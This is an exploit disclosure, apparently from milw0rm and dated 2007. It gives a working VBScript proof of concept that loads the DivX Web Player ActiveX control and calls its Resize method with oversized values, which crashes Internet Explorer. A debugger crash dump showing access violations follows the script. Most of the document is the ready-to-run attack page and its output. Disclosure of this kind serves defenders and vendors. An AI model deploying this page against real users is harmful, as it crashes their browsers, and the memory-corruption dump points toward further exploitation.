@@ -1,0 +1,90 @@
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-----------------------------------------------------------------------------
+DivX Web Player 1.3.0 (npdivx32.dll) "Resize" method Denial of Service
+url: http://www.divx.com/
+author: shinnai
+mail: shinnai[at]autistici[dot]org
+site: http://shinnai.altervista.org
+
+Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+This web player is distributed with DivX Player
+-----------------------------------------------------------------------------
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+<script language='vbscript'>
+Sub tryMe
+       document.write("<object classid=clsid:67DABFBF-D0AB-41fa-9C46-CC0F21721616 id='DivxWP'></object>")
+       argcount = 2
+       arg1 = 10000
+       arg2 = 10000
+       DivxWP.Resize arg1, arg2
+End Sub
+</script>
+----------------------------------------------------------------------------------
+
+That's a dump from faultmon
+
+13:09:34.559  pid=1624 tid=021C  EXCEPTION (first-chance)
+
+----------------------------------------------------------------
+             Exception C0000005 (ACCESS_VIOLATION writing [00000000])
+
+----------------------------------------------------------------
+             EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+             EBX=041D4580: B8 A4 50 1D 04 50 64 FF-35 00 00 00 00 64 89 25
+             ECX=017483C4: 14 00 00 00 01 00 00 00-00 00 00 00 00 2C 04 03
+             EDX=017483CC: 00 00 00 00 00 2C 04 03-00 00 00 00 00 00 00 00
+             ESP=01748334: 50 84 74 01 A4 50 1D 04-A7 11 91 7C 00 00 FE 03
+             EBP=01748358: 60 84 74 01 AB CB 92 7C-80 45 1D 04 00 00 FE 03
+             ESI=0174834C: 80 45 1D 04 01 00 00 00-60 5F 24 00 60 84 74 01
+             EDI=00000001: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+             EIP=041D4596: 89 08 50 45 43 6F 6D 70-61 63 74 32 00 00 0C C0
+                           --> MOV [EAX],ECX
+
+----------------------------------------------------------------
+
+13:09:34.622  pid=1624 tid=021C  Loaded module
+"C:\WINDOWS\system32\quartz.dll" at 747A0000
+13:09:34.653  pid=1624 tid=0930  Created thread with EIP=7C810659, TIB at
+7FFAB000
+13:09:34.669  pid=1624 tid=021C  EXCEPTION (first-chance)
+
+----------------------------------------------------------------
+             Exception C0000005 (ACCESS_VIOLATION reading [0B9CB520])
+
+----------------------------------------------------------------
+             EAX=00000051: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+             EBX=00000140: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+             ECX=000000F0: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+             EDX=04217C90: FF FF FF 00 FF FF FF 00-FF FF FF 00 FF FF FF 00
+             ESP=0174EC40: 90 7C 21 04 20 B5 9C 0B-06 13 00 00 F0 00 00 00
+             EBP=0174EC58: 90 7C 21 04 93 A5 08 04-90 7C 21 04 20 B5 9C 0B
+             ESI=04217C90: FF FF FF 00 FF FF FF 00-FF FF FF 00 FF FF FF 00
+             EDI=0B9CB520: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+             EIP=040A0541: 0F 6E 0F 0F 60 CF 0F 70-D0 FF 0F D5 D6 0F 71 D2
+                           --> ???
+
+----------------------------------------------------------------
+
+13:09:34.669  pid=1624 tid=021C  EXCEPTION (unhandled)
+
+----------------------------------------------------------------
+             Exception C0000005 (ACCESS_VIOLATION reading [0B9CB520])
+
+----------------------------------------------------------------
+             EAX=00000051: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+             EBX=00000140: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+             ECX=000000F0: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+             EDX=04217C90: FF FF FF 00 FF FF FF 00-FF FF FF 00 FF FF FF 00
+             ESP=0174EC40: 90 7C 21 04 20 B5 9C 0B-06 13 00 00 F0 00 00 00
+             EBP=0174EC58: 90 7C 21 04 93 A5 08 04-90 7C 21 04 20 B5 9C 0B
+             ESI=04217C90: FF FF FF 00 FF FF FF 00-FF FF FF 00 FF FF FF 00
+             EDI=0B9CB520: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+             EIP=040A0541: 0F 6E 0F 0F 60 CF 0F 70-D0 FF 0F D5 D6 0F 71 D2
+                           --> ???
+
+----------------------------------------------------------------
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-03-01]
